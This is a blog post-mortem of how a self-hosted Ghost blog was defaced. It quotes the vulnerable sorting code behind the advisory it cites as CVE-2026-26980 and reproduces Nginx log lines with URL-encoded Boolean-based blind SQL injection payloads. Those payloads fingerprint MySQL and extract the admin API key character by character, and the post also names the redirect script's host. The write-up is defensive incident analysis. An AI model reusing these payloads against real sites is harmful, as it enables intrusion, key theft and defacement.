---
title: "How My Blog Got the Blind SQL Injection Attack"
description: "Someone recently cracked my blog and injected the script. I traced how they exploited a vulnerability in Ghost, by using Nginx logs and the original vulnerable code."
pubDate: "2026-11-09T00:00:00+01:00"
tags: ["security", "hacking"]
lang: en
---

It was the afternoon of October 15, 2026. I opened my blog for the first time in a while to back up my posts, as a preparation of the hosting migration. But when I clicked on my latest post, some Chinese text I couldn't recognize showed up instead of my article. Someone had clearly broken into my website and injected a script to redirect visitors. The script was loading `apple99[.]cc/nmvah/maosu/6.js`.

![The page that showed something had gone badly wrong](/content/images/2026/11/attacker-text.png)

I immediately restored the previous version of the article. Protecting visitors was my first priority. After then, I started checking how much of the website was compromised. Fortunately, the scope was limited to the body of my latest article. I found no issues in any other shared areas such as the header or footer. SQL injection seemed like the most likely way someone had altered the post. So I set out to find which vulnerability they would used and how they would pulled it off.

I went through the logs for each container on the instance, starting with the most recent entries. After a while, I found a lead from `nginx-proxy` logs, which forwards incoming requests to the Ghost container. **There were 1,232 suspicious requests from a single IP address in Hong Kong on the afternoon of October 14.** By reading the logs in chronological order, I was able to see hundreds of similar requests to the public posts API, followed by a request to the Admin API that edited the affected post.

| Time (UTC) | Requests in the logs |
| --- | --- |
| 15:19 | First probe to Ghost Content API |
| 15:25 ~ 15:27 | Extracted Admin API key, then edited the post |
| 15:32 ~ 15:35 | Repeated key extraction, then edited the same post |

## Retracing the attack

### A vulnerability in the posts API in older versions of Ghost

Ghost's public posts API, `GET /ghost/api/content/posts/`, has a `filter` parameter. For example, sending `filter=slug:[first-post,second-post]` selects the posts with those two slugs. From `5.101.6` version of Ghost I used, the API also used the list to sort the results when no `order` was specified. It assigned `0` to `first-post` and `1` to `second-post`, then returned them in that order.

The problem was how Ghost built the SQL for sorting. Here's the problematic excerpt from `slug-filter-order.js` from the [Ghost 5.101.6 release package](https://registry.npmjs.org/ghost/-/ghost-5.101.6.tgz).

```js
const slugFilterOrder = (table, filter) => {
    let orderMatch = filter.match(/slug:\s?\[(.*)\]/);

    if (orderMatch) {
        let orderSlugs = orderMatch[1].split(',');
        let order = 'CASE ';

        orderSlugs.forEach((slug, index) => {
            order += `WHEN \`${table}\`.\`slug\` = '${slug}' THEN ${index} `;
        });

        order += 'END ASC';

        return order;
    }
};
```

The call to `filter.match()` pulls out what's inside the brackets in `slug:[...]`, and `split(',')` splits it on commas. The function then inserts each value into `${slug}` **without any bleaching process**. That was the source of the vulnerability.

With a normal input like the one above, the SQL would contain `= 'first-post'`. But if the input contains a single quote (`'`), it can be interpreted as **the end of the SQL string**. An attacker can change the structure of the query so the database engine evaluates the expression that follows.

### Identifying the database with Boolean-based blind SQL injection

The attacker at `16.5.50.xx` first used the vulnerability to probe for the database engine. Ghost's [built-in Zapier integration](https://ghost.org/integrations/zapier/) has an API key for automating tasks like creating posts and sharing them on social media. The attacker used that key to make the requests below.

```sh
16.5.50.xx - - [14/Oct/2026:15:19:06 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D1+THEN+hex%28randomblob%281000000000%29%29+ELSE+0+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:19:06 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D0+THEN+hex%28randomblob%281000000000%29%29+ELSE+0+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:19:06 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D1+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 200 6773 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:19:07 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D0+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
```

Let's look into the expressions like `hex(randomblob(1000000000))` and `EXP(710)`. Ghost supports both SQLite and MySQL. The attacker used these expressions to figure out which DB the site was running.

- `hex(randomblob(N))` uses a SQLite-specific functions to generate an N-byte BLOB and convert it to hexadecimal. The result would exceed SQLite's string length limit, and trigger the `SQLITE_TOOBIG` error.
- MySQL's `EXP(N)` raises *e*, approximately `2.71828`, to the power of `N`. The result exceeds the range MySQL can represent as a floating-point number, so it overflows.

The attacker tried each expression with two conditions, `1=1` (which will be always true) and `1=0` (which will be always false). The point was to see which expression could produce distinct responses for true and false on this server.

From the logs above, only the 3th and 4th lines, which used `EXP(710)`, produced different responses like `200` and `500`. That told the attacker the site was using MySQL. Even when the response body doesn't contain the value they queried for, they can infer the answer to a question they asked the database from the difference in responses. That's called the [**Boolean-based blind SQL injection**](https://community.owasp.org/attacks/Blind_SQL_Injection).

### Extracting the Admin API key one query at a time

Once the attacker had identified the database engine, they sorted the rows of type `admin` in the `api_keys` table by ID and picked the first one. They worked out the lengths of its `id` and `secret`, then took the ASCII code of the character at each position and compared it against a threshold. Here are two comparisons from the logs for the first character of the `id`.

```sh
16.5.50.xx - - [14/Oct/2026:15:25:45 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+%28ASCII%28SUBSTR%28%28SELECT+id+FROM+api_keys+WHERE+type%3D0x61646d696e+ORDER+BY+id+ASC+LIMIT+1%29+FROM+1+FOR+1%29%29+%3C%3D+54%29+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 200 6779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:25:45 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+%28ASCII%28SUBSTR%28%28SELECT+id+FROM+api_keys+WHERE+type%3D0x61646d696e+ORDER+BY+id+ASC+LIMIT+1%29+FROM+1+FOR+1%29%29+%3C%3D+53%29+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
```

| Condition | HTTP response | Result |
| --- | --- | --- |
| Is character's ASCII at most `54`? | `200` | `<=54` |
| Is character's ASCII at most `53`? | `500` | `>53` |

Together, those results give an ASCII code of `54`, which is the character `6`. The attacker was using the same Boolean-based blind SQL injection technique. They put `EXP(710)` in a conditional expression to trigger a MySQL overflow, and inferred each value from the HTTP status code. Once they extracted the Admin API key, including its 24-character `id` and 64-character `secret`, they could edit the post at will with a PUT request, like the logs below.

```sh
16.5.50.xx - - [14/Oct/2026:15:27:38 +0000] "PUT /ghost/api/admin/posts/{post-id}/ HTTP/1.1" 200 7884 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:32:56 +0000] "GET / HTTP/1.1" 200 10655 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
```

## What I learned from the investigation

### Keep up with security patches in production

Ghost had already disclosed the Content API [SQL injection vulnerability `CVE-2026-26980` and released a patch](https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97) on February 16, 2026. I usually keep up with the security advisories for our products at work, yet I didn't pay enough attention to vulnerabilities in my own website. I should have been more careful.

If you run an application in production, it is you who are responsible for maintaining it. Security is the crucial part of the operation. When you're operating a service across multiple containers, you need to check the host OS, the runtime environment, and each container regularly for security issues.

### Keep track of keys you didn't create and values in environment variables

The Admin API key I found during the investigation came from **the Zapier integration that ships with Ghost**. I'd never created or used it, so it had slipped under my radar.

When you think about managing secrets, it's easy to think only of keys you've issued yourself or passwords you've entered. But applications can also generate keys and store them in the database, and there may be secrets in environment variables or `.env` files. If you're running an application, you need to know where each value that needs protection is stored and which processes read it. It's also worth minding that values passed through environment variables can be exposed when you share deployment settings or logs.

### Attackers will go after sites of any size or kind

During the investigation, I found some other similar cases based on the same vulnerability. In every case, the attacker had injected a redirect script from the same path.

- [My blog got hacked - and how to scan your own sites for injected scripts](https://www.kernelreloaded.com/my-blog-got-hacked-and-how-to-scan-your-own-sites-for-injected-scripts/)
- [Investigating a Ghost injection attack](https://www.ruanx.net/ghost-redirect-attack-review/)

I hadn't thought anyone would bother attacking a site like mine, which barely has a single visitor at a day. But I changed my mind once I figured out what the attacker was trying to do. The script was meant to send visitors (who has a certain quary parameter in URL) to a download link for a Chinese dating scam app. My guess is that, they were taking over other people's websites to set up redirects that could slip past internet providers' spam filters. If that's what they were after, they probably didn't care how much traffic the victim's site got. All they needed was a way to launder the URL.

We are living in the era where anyone can code with just few simple sentences. That also means anyone can crack someone else's code whenever they want. I doubt the recent rise in incidents involving open-source and commercial software is unrelated to that shift. From now on, I need to think of every endpoint exposed to the internet as a potential vulnerability for both me and my customers.
